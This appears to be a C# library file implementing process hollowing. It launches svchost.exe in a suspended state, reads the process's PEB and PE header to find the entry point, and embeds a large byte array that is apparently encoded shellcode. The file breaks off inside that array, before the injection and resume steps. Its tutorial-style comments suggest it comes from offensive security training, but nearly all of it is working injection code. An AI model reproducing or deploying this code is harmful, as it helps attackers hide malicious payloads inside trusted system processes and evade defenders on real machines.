using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace ProcessHollowingLib
{
    [ComVisible(true)]
    public class ProcHollower
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);


        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
               IntPtr hProcess,
               IntPtr lpBaseAddress,
               byte[] lpBuffer,
               Int32 nSize,
               out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        public ProcHollower()
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(
                 null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            //fetch the address of the PEB from the PROCESS_BASIC_INFORMATION structure
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            //The ptrToImageBase variable now contains a pointer to the image base of svchost.exe
            //Following the DllImport, we can call ReadProcessMemory by specifying an 8 - byte buffer that is
            //then converted to a 64bit integer through the BitConverter.ToInt64278 method and then casted to a
            //pointer using (IntPtr)
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            //The following step is to parse the PE header to locate the EntryPoint.This is performed by calling
            //ReadProcessMemory again with a buffer size of 0x200 bytes
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            //To parse the PE header, we must read the content at offset 0x3C and use that as a second offset
            //when added to 0x28 convert the four bytes at offset e_lfanew plus 0x28 into an unsigned integer. 
            //This value is the offset from the image base to the EntryPoint
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            //The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual
            //address(RVA).We must add it to the image base to obtain the full memory address of the EntryPoint.
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] buf = new byte[] {
                0x4c,0xab,0x4e,0x7a,0xc6,0x4c,0xae,0xbd,0xb8,0xd8,0x16,0xa9,0xf1,0x2e,0x01,0x00,0x0e,0xa1,0xf4,0xfd,0xa0,0xac,0x67,0xff,0x34,0xc1,0xb7,0x94,0x0b,0x32,0x2d,0xe2,0x39,0xcc,0x9c,0x6f,0x09,0x9b,0x22,0x9f,0x63,0x1b,0xaf,0x27,0x15,0x3a,0x63,0x06,0xd3,0xa3,0x71,0x01,0xd4,0xb3,0x3f,0x63,0xcc,0x76,0xe5,0xa1,0xe9,0x46,0xf5,0x00,0xd3,0x11,0xed,0xd1,0xbd,0x43,0x68,0xf9,0x5b,0x35,0xe9,0x73,0x73,0x6c,0x37,0x71,0x5f,0x79,0x4b,0xe9,0x29,0xac,0xbc,0x6e,0x05,0xe9,0x72,0x10,0x70,0xba,0xa9,0xe4,0x29,0x73,0x6f,0x54,0xbb,0xd8,0x40,0xe9,0xb3,0x0f,0xd6,0x08,0xea,0xa7,0x49,0x72,0x6b,0x0f,0xf6,0x73,0x5c,0xe6,0x81,0x5d,0x2b,0xba,0x4a,0x02,0xe4,0x45,0x24,0x41,0xbc,0xbd,0xc9,0x61,0x46,0xdb,0xe5,0x95,0xee,0xba,0xb2,0xec,0x1f,0xb2,0x56,0x7e,0xa3,0x82,0x45,0x45,0x98,0x44,0x87,0x74,0xe1,0x36,0xba,0x18,0x30,0x22,0x53,0xe1,0x21,0x19,0x36,0x87,0x28,0x0e,0xf2,0x61,0x53,0x44,0x22,0x84,0xe2,0xcc,0xcf,0x21,0xb6,0xd8,0x07,0xcd,0x72,0x6d,0xca,0x43,0x98,0x6e,0x4c,0x6a,0x3f,0xa4,0x4b,0xfc,0x9a,0xcf,0xff,0xd1,0xc7,0x13,0x15,0xa0,0x63,0x99,0x80,0x12,0x51,0x98,0x98,0x01,0x50,0x28,0xe2,0xfc,0xb5,0x9d,0x73,0x7c,0x98,0xaa,0xe8,0xba,0xd6,0xfc,0x57,0xed,0xe2,0x74,0xf4,0x47,0xfd,0xc5,0x79,0x0a,0xfd,0x0b,0x19,0x13,0x44,0x01,0x92,0xa5,0x7b,0x99,0x9f,0xfb,0xfa,0x09,0x17,0x02,0x6f,0x01,0x75,0xcc,0xc4,0xb2,0xd4,0xa7,0x86,0x90,0x6d,0xc5,0x77,0xa3,0xaa,0x67,0x8d,0x0b,0xae,0xab,0xf1,0x00,0x4b,0x95,0x77,0x56,0xf2,0x57,0x0f,0xe2,0x51,0xe5,0x3c,0xd7,0xd0,0x2b,0xd9,0xe3,0x2b,0x2b,0x2e,0x70,0x9f,0x86,0x77,0xbe,0x73,0xba,0x6c,0xd4,0xd5,0xc8,0x40,0xc5,0x03,0x75,0x2c,0xe8,0x20,0x01,0xfa,0xa3,0xbf,0x76,0x70,0x61,0x2c,0x45,0x53,0x76,0x50,0x7b,0xda,0x74,0x30,0xc8,0xb0,0x05,0x4e,0x61,0x09,0x5f,0xda,0xce,0x57,0x55,0x12,0x88,0x79,0x70,0xb5,0xa8,0x72,0xca,0xd0,0x88,0x37,0x8d,0xc3,0xe0,0xcd,0x6d,0x9e,0x1f,0x2d,0x11,0x10,0x37,0xfb,0x5f,0x35,0xb0,0x59,0x08,0x72,0xb2,0x06,0xc4,0xcd,0x5f,0xc0,0xc2,0xf7,0x3c,0x39,0x04,0xca,0xac,0x8b,0xff,0xd8,0x00,0x03,0x44,0x91,0xae,0xf6,0x21,0x14,0x5c,0x49,0x42,0xa2,0xa7,0x26,0xe7,0xbe,0x7c,0xce,0x46,0xeb,0x50,0xd1,0xb1,0x64,0xe4,0xaa,0x51,0x7d,0x14,0x06,0xf5,0xbb,0x13,0xa3,0x06,0x62,0x1a,0xbd,0x18,0x22,0xc2,0xc2,0x59,0x53,0x99,0x63,0x2a,0x60,0xea,0x0f,0x57,0xeb,0x10,0x47,0x3a,0x6b,0x42,0xce,0x7e,0x22,0x26,0xfe,0x45,0x49,0x89,0xa0,0x5c,0xbb,0x1a,0x6a,0xae,0x8d,0xa5,0x32,0xe5,0xd0,0x64,0x73,0xf0,0x35,0x33,0xc4,0xf8,0x97,0x40,0x0c,0x31,0xdc,0xde,0x40,0x79,0x81,0xfe,0x23,0x06,0xb6,0x04,0x3c,0x8d,0xf2,0xd6,0xd9,0xd2,0xa2,0x3c,0x3e,0xcd,0xaa,0xf0,0x85,0xa7,0xf2,0xb8,0x58,0x1d,0xd1,0x31,0xcc,0x52,0x04,0x13,0xf0,0x8e,0x9e,0xf2,0xbf,0xcf,0xa5,0x2a,0x44,0x2e,0x30,0x67,0x3d,0x45,0x22,0x53,0xaa,0x38,0x2c,0xc6,0x2c,0x8e,0xdc,0x72,0x90,0x23,0x5c,0xfd,0xa0,0xa4,0xb9,0x79,0x45,0xb2,0x41,0xf3,0x66,0x9b,0xa1,0x82,0x1b,0x43,0x06,0xe7,0x24,0x6b,0x48,0xe1,0x05,0xc9,0xdd,0x1a,0xa8,0xad,0x18,0x2c,0x5f,0xcf,0xdd,0x51,0x62,0x72,0x4c,0x04,0xe9,0x0c,0xde,0xe6,0xf0,0xdd,0xcd,0xda,0x0c,0x43,0x3b,0xaa,0x47,0x4d,0xf9,0x97,0x10,0x2d,0xe0,0x7c,0x89,0x50,0xc3,0x81,0xbd,0xa0,0xc1,0x4f,0x0b,0xf5,0xbd,0xad,0x8d,0x52,0x15,0x23,0xa9,0x8e,0xf7,0xcf,0x97,0x37,0x64,0xfd,0xdf,0x11,0x37,0x3d,0xe8,0x04,0x69,0x8f,0xdf,0x76,0xf8,0x39,0xcc,0x97,0xb5,0x3f,0x55,0x9e,0x10,0xa1,0x99,0x5f,0x85,0xcb,0x07,0x25,0x5d,0x4f,0x9e,0xad,0xe2,0xe7,0xa8,0x60,0x56,0x89,0xd9,0x60,0x90,0xf0,0xee,0x3f,0x46,0x80,0xd5,0x09,0x67,0xab,0xd9,0xc6,0x6c,0xce,0xf9,0xf5,0x5d,0x99,0xc6,0x68,0x72,0x64,0xf5,0x8f,0x64,0xae,0xb4,0x4a,0x5d,0xe2,0xff,0xba,0xc5,0x3a,0x41,0xe2,0x4f,0x69,0x00,0x4d,0xf1,0x57,0x4d,0xf7,0xac,0x1a,0xd1,0xf9,0xdf,0x94,0x8c,0x04,0x9a,0x49,0x0c,0xcd,0x61,0x02,0x9a,0x0d,0xfb,0x74,0xed,0x8b,0xe2,0x11,0x29,0x5f,0x2c,0x5d,0x07,0xdd,0xfd,0x8b,0x3e,0x0f,0x12,0x73,0x00,0x37,0xf8,0xca,0xae,0x8d,0x6f,0x6f,0x68,0x24,0xfa,0x38,0xea,0x64,0x76,0x2d,0x02,0x4e,0x23,0xbb,0x68,0xb5,0x73,0xa1,0x87,0xf8,0x99,0xef,0x1e,0x36,0xae,0x36,0x31,0x5a,0x67,0x15,0x59,0x3e,0x6e,0x01,0x8d,0x70,0x31,0x04,0x32,0x46,0x21,0xd9,0x63,0x0f,0xd8,0xb5,0x89,0x5f,0x0a,0xee,0xd5,0xa5,0x0c,0xfb,0x57,0x4c,0xec,0x8c,0x08,0x8f,0x19,0x57,0x08,0x46,0xec,0xf0,0xf6,0x33,0x53,0x9c,0x30,0xf1,0x0d,0x9d,0x50,0x75,0xc9,0x70,0x57,0xbd,0x4f,0x1d,0x30,0x27,0xd2,0xab,0x37,0x65,0xd4,0x6d,0x0d,0xa3,0xea,0x7c,0x84,0x6a,0x66,0xff,0x71,0x57,0xee,0xf2,0xe7,0xaf,0x6e,0xba,0xdd,0x8c,0xf6,0x78,0x41,0xf0,0xc3,0x22,0xf4,0xb4,0xe1,0x30,0xa4,0x94,0xa4,0x44,0xec,0xf2,0x96,0x85,0x42,0x10,0x8a,0x7d,0xfc,0x70,0x3a,0xcd,0x33,0x5a,0xab,0x2a,0xd1,0xe5,0xce,0xf7,0xc7,0x53,0x69,0x7c,0x19,0x48,0xc9,0xfb,0x01,0xce,0x97,0x91,0x50,0x6f,0x3a,0x1b,0x09,0x7f,0x57,0x6e,0x9d,0x6a,0x08,0x84,0xbb,0x64,0xc7,0x8b,0x36,0x96,0xf9,0x65,0xaa,0xff,0x8c,0x27,0x5a,0x72,0xc9,0x0e,0xa8,0xdb,0x98,0xfa,0x71,0x47,0x0e,0xba,0x11,0x5e,0xd7,0x7d,0xbb,0x53,0x80,0x11,0x0c,0x1f,0x88,0xd6,0xd8,0x77,0x7f,0x45,0xc1,0x32,0xa2,0x56,0x93,0x57,0xc5,0x6d,0x73,0x85,0x99,0xf9,0xe2,0xc3,0xa7,0x11,0xe8,0x05,0x3b,0xbd,0xfe,0x94,0x0f,0x6b,0xa5,0xa5,0x60,0xa9,0x9d,0x42,0x5b,0xae,0x9b,0xc3,0x29,0x38,0x5e,0xd3,0x80,0xf9,0x1f,0xc6,0x1a,0xf8,0xbc,0x39,0x94,0xf9,0xa8,0xc6,0xc6,0xdb,0xe5,0x18,0x37,0x69,0x79,0xad,0x6b,0xc1,0x47,0x01,0x57,0x26,0xbb,0x31,0x0a,0x1c,0xdd,0x7c,0x4d,0x64,0xdc,0xf3,0x54,0x7c,0x44,0x3f,0x27,0xc7,0x75,0x11,0xc7,0xf5,0x58,0xd6,0xe1,0x98,0x8b,0xc9,0xf6,0xc5,0x47,0x9e,0x5a,0xd8,0x47,0x4f,0xfe,0xd8,0xbb,0x9e,0xba,0xa5,0x04,0x1f,0xae,0x7a,0xcf,0xfe,0x25,0x1a,0xdd,0x0a,0xa2,0x50,0x6b,0x1f,0x64,0x81,0x5a,0x3d,0x99,0x23,0xc8,0x7b,0xb5,0x52,0x3c,0x9a,0x8a,0xc4,0xcf,0x8f,0xd0,0x92,0x72,0xfc,0x88,0x1d,0x9c,0x12,0x8f,0xab,0x4f,0x5e,0x83,0x1e,0x62,0x67,0x06,0x5b,0x3d,0x9f,0xa0,0x7c,0xf8,0x6b,0xda,0xbe,0x69,0xa5,0x5b,0xae,0xb2,0xbe,0xe6,0x47,0xb7,0x8a,0xf4,0x3c,0x39,0x5e,0x71,0x15,0x01,0x67,0x0b,0x2e,0xea,0x40,0x98,0x23,0xb5,0xae,0x71,0x31,0xa3,0xf3,0x8d,0x4a,0x88,0xb4,0x18,0x75,0xaf,0xe8,0x9b,0x83,0xf2,0x0f,0xed,0x27,0x50,0xcb,0xea,0xf4,0x4c,0xc7,0x4e,0x07,0x7b,0x4e,0xeb,0xa2,0x2d,0xca,0x59,0xb3,0xab,0xc7,0xad,0x44,0xad,0xf8,0x62,0xa7,0x0f,0x27,0xc5,0xf2,0xc9,0xb6,0x72,0xe6,0x5e,0xcf,0x15,0xe8,0x71,0x3d,0xe7,0x00,0x23,0x08,0xb1,0xfc,0x6f,0xea,0x29,0x12,0xa1,0x63,0x9d,0xe2,0x3b,0x2d,0xf7,0x7f,0xf7,0xe9,0x1a,0x8f,0xe9,0xbc,0x58,0x01,0x1e,0x8e,0xe3,0x9d,0x58,0x0f,0xc3,0xfc,0xc5,0x1a,0xb7,0x5c,0x95,0xff,0x85,0xd0,0xe5,0x63,0x33,0x52,0xfa,0x03,0x7e,0xe1,0xd4,0x7c,0x67,0x2b,0x8e,0x9d,0xd1,0x59,0xae,0x67,0xb5,0xb2,0xe3,0x94,0xc5,0xa5,0xca,0x07,0xd9,0x60,0x83,0xee,0x2b,0x9d,0x71,0x7f,0xc5,0x0a,0x8c,0x4e,0x12,0x66,0x1c,0x30,0x13,0x45,0x99,0xe5,0x08,0xf0,0x39,0x8e,0xfb,0xf5,0x1f,0x3c,0x36,0x39,0x52,0xbd,0x75,0xa4,0x30,0x84,0x6f,0x9a,0xbe,0x73,0x90,0xcb,0xb4,0x2a,0x57,0x38,0xac,0xb5,0xc2,0x0a,0x63,0x9f,0xaa,0x47,0xff,0xba,0x12,0x35,0x72,0x42,0x66,0x68,0xd8,0xb1,0x94,0xf7,0x6d,0xbe,0x69,0x7c,0xae,0xf4,0x29,0x3f,0x70,0xcf,0x24,0x8e,0xc4,0xbb,0xf3,0x68,0xda,0xa0,0x0b,0xfc,0x81,0x41,0x83,0x14,0x84,0x5b,0xd9,0xaa,0x07,0x98,0xce,0x25,0x9f,0x0d,0x6c,0xcb,0x1a,0xd0,0xd0,0xea,0x1c,0x1f,0x87,0x13,0x74,0x70,0xc7,0x8f,0x2c,0xe1,0x7b,0x56,0x00,0x77,0x64,0x48,0xe6,0x0a,0xd6,0xe2,0x89,0x88,0x84,0x98,0x47,0xae,0xd1,0x8b,0xfa,0x2f,0x2c,0x58,0x04,0x24,0xae,0x9e,0x85,0xbc,0xcf,0x3e,0xc0,0x33,0x4c,0xa0,0xc6,0x55,0x77,0x63,0x74,0x30,0x30,0x28,0xc8,0xa9,0x61,0x22,0xde,0xee,0x95,0x2f,0x12,0xf1,0x89,0xa6,0xeb,0xe9,0xe8,0xfb,0x97,0x65,0xeb,0x2c,0x5d,0x4f,0x9b,0x5f,0xd0,0x22,0x93,0x77,0x4f,0x71,0x79,0x49,0xcb,0xd9,0xc5,0x32,0x81,0x35,0x6f,0xa2,0x3d,0x09,0x6d,0x6d,0x2c,0x99,0x72,0x87,0x06,0x2e,0x00,0xe6,0x27,0x00,0x90,0x28,0xc8,0x8a,0xb9,0x3a,0xc5,0x8a,0xfd,0x8a,0xc9,0x02,0x1c,0xe7,0xd9,0xef,0xc5,0x4d,0xd2,0x0d,0x1d,0x43,0x08,0xc9,0xc9,0x12,0x00,0x2d,0x9b,0xdb,0x73,0x95,0x45,0x70,0xbe,0xaa,0x75,0x0f,0x70,0xc8,0x4a,0x01,0xbe,0xef,0xca,0x09,0x24,0xa6,0x6c,0x79,0x58,0xd0,0x28,0xfa,0x81,0x67,0x57,0xfa,0x4a,0x2d,0xd2,0xa0,0x4e,0x3c,0x21,0x8b,0x54,0xae,0xe3,0x6c,0x3e,0x7f,0x35,0x0e,0xbf,0x61,0x6f,0xf7,0x91,0x22,0x34,0x6d,0x8c,0x45,0x75,0x78,0x52,0xb8,0x00,0xf0,0x85,0x20,0x37,0xfe,0x57,0x28,0x36,0x9d,0xe4,0x3b,0xf5,0x78,0x38,0xf7,0x96,0x47,0x5d,0xf6,0x7c,0x13,0xcb,0x40,0x52,0x90,0x12,0xc8,0x40,0x60,0x84,0xb5,0x25,0x77,0x8f,0x2a,0x2e,0x44,0xb3,0xd3,0x3a,0x66,0xdb,0x62,0x24,0x81,0xc4,0x3d,0xf2,0x38,0x76,0x03,0xcf,0xc4,0x31,0x1e,0xbc,0x3c,0xde,0xad,0x22,0xd1,0x7f,0xf9,0xda,0xce,0x51,0x0e,0x98,0x6c,0x25,0x7b,0x27,0xf1,0xf4,0x31,0x9e,0x25,0xd4,0x84,0x4a,0xce,0x8d,0x62,0x06,0x1b,0x43,0x90,0x15,0xb2,0xd2,0xa0,0xd0,0x7f,0x22,0x10,0x95,0xbc,0xc3,0x9a,0x02,0x6f,0x0f,0xac,0x45,0x7c,0xf5,0xeb,0x54,0xbd,0xe4,0x98,0x1b,0xfc,0x0c,0x6e,0x62,0xd6,0x44,0x49,0xdb,0xbd,0x8b,0x02,0xd5,0xca,0xe0,0x03,0xd6,0xad,0xab,0xf3,0x90,0xbf,0x71,0xbf,0x6d,0xdc,0x5a,0x12,0x74,0xca,0xa4,0xed,0x4c,0x61,0xe0,0xd0,0x82,0xd2,0x95,0x50,0x2d,0x9f,0xca,0x4a,0x23,0x81,0xcf,0xc2,0x55,0x1c,0x21,0x9e,0xab,0x51,0x9f,0xe3,0xa6,0xef,0x6d,0x3a,0x5d,0x13,0xb1,0xbf,0xbc,0xed,0xdb,0x48,0x26,0x4c,0x38,0x79,0x26,0x70,0x40,0x63,0x1e,0x2b,0x7f,0x5f,0xdd,0x33,0x47,0x01,0x9b,0x22,0x82,0x1c,0xdf,0x50,0x55,0x5a,0x1d,0x4a,0x76,0x83,0xb5,0xa1,0x11,0xda,0x67,0xdb,0xf1,0x84,0x16,0xb9,0x92,0xa3,0xee,0x12,0xb4,0x29,0x70,0x8a,0x0e,0x89,0x44,0xb4,0x66,0xcb,0xf5,0x34,0x28,0x7c,0x8c,0x72,0xb2,0x7c,0x44,0x5c,0x65,0x37,0x07,0xd4,0xb2,0x34,0x71,0x5a,0x84,0xa3,0x75,0xcc,0xf1,0x66,0x79,0xaf,0x46,0x15,0xa3,0x19,0x34,0x17,0x94,0xc8,0xbf,0x0a,0xc9,0xb1,0x7c,0xec,0x56,0x15,0x83,0xbb,0xf5,0x3f,0x65,0xc8,0x85,0xe5,0xb6,0x2a,0xca,0xb3,0x7e,0xdd,0xb7,0x65,0x40,0x3c,0xab,0x8c,0x60,0xae,0x97,0x21,0xe4,0x6f,0xd1,0xd1,0x4c,0x3c,0x0c,0x9f,0xf2,0x31,0x8f,0x60,0x5b,0x29,0xd5,0xba,0x3c,0xa4,0x9b,0x78,0xc0,0x0c,0x70,0x0f,0x80,0x25,0x6e,0xda,0x29,0x36,0x8c,0x12,0xbf,0x6e,0xa8,0x83,0x81,0x87,0x98,0x87,0x93,0xde,0xd1,0x1c,0xf7,0x0c,0xa6,0x79,0x5f,0x7b,0xdc,0x7a,0x10,0x70,0xa7,0x2e,0xed,0xd4,0x20,0xa4,0x2a,0xdf,0x5a,0x9d,0x36,0x50,0xa1,0x9c,0x26,0x3a,0xf4,0x0e,0xd4,0x34,0x94,0x3c,0xc9,0x71,0xa8,0x93,0xcd,0xd0,0x15,0x7d,0x9d,0x65,0x3b,0xf9,0x0b,0x74,0x13,0x99,0x02,0xf5,0x51,0x8c,0x33,0x50,0xa9,0x6c,0x3f,0xf3,0x4c,0x78,0xc6,0xa6,0xf1,0x9d,0xbb,0x99,0x3b,0xc2,0xd8,0x4b,0x5c,0xff,0x49,0x70,0xde,0x63,0xc2,0x91,0x90,0xeb,0x25,0xb9,0xa8,0x0a,0x79,0xbf,0x52,0xe2,0xa1,0x75,0xc8,0xb4,0x7f,0x60,0x57,0x8e,0x74,0xe4,0xbd,0x7c,0xd7,0xb1,0x20,0xdc,0xc4,0xc2,0x4a,0xf9,0xe2,0x13,0x34,0xeb,0x07,0xe5,0xca,0x6d,0x89,0x68,0xc3,0x12,0x5e,0x22,0x34,0x38,0xff,0xaa,0xf8,0xde,0x62,0x73,0x68,0xf7,0x8c,0x18,0x8b,0xa2,0xfe,0x88,0x03,0x62,0xee,0x0f,0x01,0x4e,0x53,0xa9,0x64,0xf0,0xe2,0x03,0xcb,0xd6,0xee,0x00,0x93,0x10,0x5e,0x4b,0x81,0xdf,0xfc,0xab,0xc2,0x60,0xb0,0x93,0xd2,0x1f,0x92,0xe9,0xaf,0xa4,0xd8,0xdb,0x7f,0x0a,0x31,0x94,0x76,0xe8,0x1d,0xcf,0x21,0x5f,0xd1,0x11,0xbb,0x4f,0x90,0x98,0x02,0x31,0xbc,0x52,0x16,0xf8,0xdc,0x3b,0x22,0xb8,0x2e,0xc3,0xfd,0x89,0x23,0x3f,0xc3,0xc9,0x64,0x69,0x84,0x31,0xa4,0xee,0x2c,0x67,0x1e,0x5e,0x34,0x5d,0x9f,0x97,0xd4,0x96,0xf1,0x21,0x11,0x2d,0xb2,0x34,0xda,0xa6,0xdf,0x06,0x97,0xd3,0xca,0xdd,0x53,0xd0,0xb4,0x41,0xc7,0x1d,0x65,0xaf,0xa1,0xf8,0x7b,0x40,0x9c,0xb7,0xcc,0x58,0xf2,0x3a,0x47,0xc3,0x76,0x71,0x57,0x87,0x2c,0x03,0x02,0x55,0x29,0x66,0xa2,0xec,0x3f,0x06,0x85,0x65,0x55,0x00,0x2f,0xd2,0xd7,0x83,0x1a,0x8e,0xcb,0xc9,0x42,0x94,0xd1,0x75,0x82,0x15,0x8c,0x14,0xf9,0x3f,0x6c,0xb5,0x20,0x49,0x87,0x43,0x16,0x2a,0x94,0xab,0x39,0x15,0x78,0xc9,0xd5,0xfd,0xf7,0x1b,0x66,0x5b,0xdb,0x98,0xdd,0x06,0x50,0x87,0x91,0xc9,0x5e,0xed,0xfb,0xa8,0x39,0x0b,0xc6,0x6c,0x48,0x15,0x98,0xe3,0x35,0x3d,0xce,0x90,0xd0,0xd6,0x92,0x2f,0x77,0x37,0x6f,0x63,0x4f,0xa6,0x00,0x4d,0x91,0x29,0x31,0x84,0x68,0xd1,0xc1,0x51,0x36,0xcc,0x5e,0x44,0xf2,0x98,0xc9,0x34,0xc0,0x03,0x4e,0xcb,0x24,0xe8,0x1d,0x2a,0x04,0xa7,0x7b,0x6c,0xa6,0xd4,0x55,0xa4,0x4d,0x29,0xb9,0x33,0x1f,0xff,0x1d,0x06,0x61,0x37,0x95,0x35,0xf3,0x99,0xfd,0xe0,0xb3,0x83,0xe6,0x59,0x14,0x44,0x25,0x9b,0xeb,0xbf,0xb0,0x96,0xc5,0xb7,0xc9,0x7f,0xcc,0x70,0xac,0x30,0x50,0xf9,0xee,0x44,0x83,0x48,0x22,0x52,0x43,0x75,0xda,0x7c,0xd3,0x68,0x12,0x76,0x04,0x27,0x1d,0x58,0x3d,0xf3,0x6b,0x79,0xba,0xe0,0xb9,0x9a,0xef,0x8b,0x25,0x86,0x53,0xc7,0xf2,0x28,0x73,0xbe,0x94,0xa7,0x2c,0x93,0xa1,0x23,0x1d,0x7e,0x88,0x6f,0x29,0x5f,0x2f,0x86,0x75,0x43,0x40,0x9c,0xd9,0x1f,0x0f,0xc5,0xe0,0x7a,0xf3,0x0d,0x5d,0xb8,0x67,0x67,0x9e,0x18,0x33,0x52,0xb3,0xaf,0x2e,0xec,0x46,0x9c,0xc3,0x98,0x89,0xf7,0x5b,0x07,0x76,0x20,0x32,0x4b,0xbb,0xff,0xe5,0xfe,0xf0,0x2a,0x72,0xd1,0x6d,0xf3,0x66,0x7d,0x62,0x66,0x8f,0x51,0xce,0x39,0xd0,0x9a,0x73,0xf2,0x51,0x56,0xae,0x61,0x2d,0x1f,0xb5,0x50,0xfd,0x05,0xac,0xf6,0x0e,0x23,0x1a,0xd2,0xb6,0x17,0x07,0x77,0xd7,0xeb,0xa6,0xb3,0x2a,0xf4,0xff,0x4c,0x00,0xe5,0xf9,0xa1,0xb0,0xd6,0x18,0x69,0x41,0x3d,0x8b,0x6f,0x99,0xe3,0xf0,0xf5,0xd6,0xab,0xd3,0x0c,0x2c,0x4c,0x4e,0x0b,0x90,0x19,0xa8,0x55,0xd5,0x2d,0x06,0x3e,0x17,0x17,0xcf,0xaa,0xb3,0xe7,0x8f,0x63,0xc0,0x44,0x69,0x77,0xd6,0x83,0x36,0xa3,0xf4,0xa6,0xd1,0x4c,0x62,0xf3,0x6f,0x76,0x75,0xbc,0x36,0x09,0xd1,0x14,0xd9,0xe3,0x16,0xc8,0x1c,0x71,0x90,0x23,0xd2,0xbc,0xf1,0xdd,0x07,0xb8,0x98,0x53,0x45,0xbc,0x0f,0x62,0x0b,0x85,0x7b,0xdf,0xf0,0x75,0xdc,0x6e,0x27,0x31,0xdc,0xb4,0xde,0xa6,0x5e,0x52,0x69,0x3f,0x0b,0xea,0x8e,0x1a,0xf1,0x02,0x55,0x82,0x75,0x6e,0x13,0xe8,0x12,0x99,0xd9,0x05,0xf6,0x3d,0x9d,0x38,0x8f,0x11,0x31,0x57,0x9c,0x6e,0x7c,0x34,0x91,0x85,0x7d,0x72,0xa4,0xfe,0xba,0x90,0x77,0x61,0xe9,0x09,0x82,0xb8,0x46,0xcb,0xde,0xbe,0x3d,0x4a,0x5d,0x04,0xaa,0x58,0x3b,0xa2,0x8a,0x9b,0x14,0xf7,0x3b,0x90,0xaf,0xe1,0xe1,0xc7,0x6a,0xf9,0x99,0x5d,0x07,0x55,0x55,0x4b,0xba,0x54,0xf5,0x4a,0xfd,0x5e,0x43,0xd6,0xf9,0xf5,0x87,0x3d,0xa1,0xc2,0xe6,0x4e,0xa1,0x5c,0x53,0xb2,0xf0,0x66,0x76,0x5d,0x51,0xaa,0x58,0x42,0x2b,0xc6,0xe7,0x84,0x17,0x89,0x20,0x5e,0x41,0x51,0xae,0x8b,0x76,0x8e,0x25,0x93,0xe3,0xf8,0x3b,0x5d,0x1d,0x44,0xcf,0x75,0x05,0x8c,0x94,0x7e,0x5d,0xac,0x74,0x5f,0xb2,0xe8,0x93,0xa5,0xda,0x7b,0x68,0xb8,0xfb,0x34,0x51,0xd7,0x4f,0x4c,0xb5,0x0a,0x2c,0xa2,0x98,0x27,0x6a,0xfb,0xbd,0xad,0x2b,0x35,0x06,0xf5,0x90,0x99,0x32,0xc4,0x5a,0x63,0xc2,0x74,0x86,0x81,0x74,0x57,0xe7,0x86,0xf3,0xa5,0x89,0x72,0xc6,0x63,0x72,0xe6,0x0a,0x23,0xa9,0x1c,0xfd,0xee,0xe8,0xef,0x70,0xaf,0x93,0x9f,0x6f,0x6b,0x6d,0xfb,0x66,0x0d,0x78,0x07,0x21,0xa9,0x05,0xaa,0xd0,0x46,0x14,0x56,0xed,0x3a,0x2d,0xea,0x44,0xa6,0xda,0x9d,0x3e,0x71,0xa7,0x78,0xd5,0x29,0xed,0xe1,0x3a,0x08,0xe0,0x63,0x49,0x22,0x64,0x53,0x9c,0x89,0xbc,0x84,0xa4,0x16,0x21,0x22,0x8a,0x93,0x89,0x36,0x00,0x47,0xff,0x70,0x00,0x7e,0x21,0xc8,0xc1